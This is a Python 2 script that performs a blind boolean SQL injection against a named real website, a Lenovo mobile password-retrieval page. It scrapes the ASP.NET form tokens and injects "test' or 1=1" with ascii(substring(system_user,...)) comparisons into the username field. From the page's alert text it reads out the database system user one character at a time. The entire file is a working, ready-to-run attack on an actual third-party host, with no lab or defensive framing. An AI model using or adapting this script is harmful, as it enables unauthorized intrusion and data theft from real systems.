import re
import urllib2
import urllib
import httplib
import time
import socket

  
def getuser():

    HOSTSTR="http://esdmobile.lenovo.com.cn/SDIMoblieWeb/Views/Account/PasswordRetrieve.aspx"
    USERNAME="test' or 1=1"
    SYSTEM_USER=[]
    for i in xrange(1,8):
        for x in xrange(32,126):
            result=pageresult(HOSTSTR)
            payload=USERNAME+' and ascii(substring(system_user,'+str(i)+',1))='+str(x)+' -- '
            VIEWSTATE=re.findall('VIEWSTATE" value="(\S+)"',result)
            EVENTVALIDATION=re.findall('EVENTVALIDATION" value="(\S+)"',result)
            paradata={'__VIEWSTATE':VIEWSTATE[0],'__EVENTVALIDATION':EVENTVALIDATION[0],'__VIEWSTATEGENERATOR':'27C1BC59','username':payload,'Email':'1234567@lenovo.com','btnsave':'%E4%BF%9D%E5%AD%98'}
            result=pageresult(HOSTSTR,paradata)
            if result:
                result=re.findall('alert\(\'(\S+)\'\)',result)
                if len(result[0])==27:
                    print 'The character was found',chr(x),'\n'
                    SYSTEM_USER.append(chr(x))
                    break

            time.sleep(0.4)
    print 'SYSTEM_USER is ',''.join(SYSTEM_USER),'\n'
def pageresult(url,postdata=''):

    socket.setdefaulttimeout(30)    
    headers_values = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",  
             "Accept": "text/plain"}
    if postdata=='':           
            req = urllib2.Request(url,headers=headers_values)            
    else:
        req=urllib2.Request(url,urllib.urlencode(postdata),headers=headers_values)
    try:     
        page = urllib2.urlopen(req,timeout=30).read()   
        return page
      
    except urllib2.HTTPError,e:  
        print e.code    
        return None
    except urllib2.URLError,e:
        print e.reason  
        return None
    except httplib.BadStatusLine,e:
        print 'BadStatusLine'     
        return None           
    except socket.error,e:
        print (str(e)) 
        return None 
    else:
        return None      
if __name__ == "__main__":
   
    getuser()
        
       
            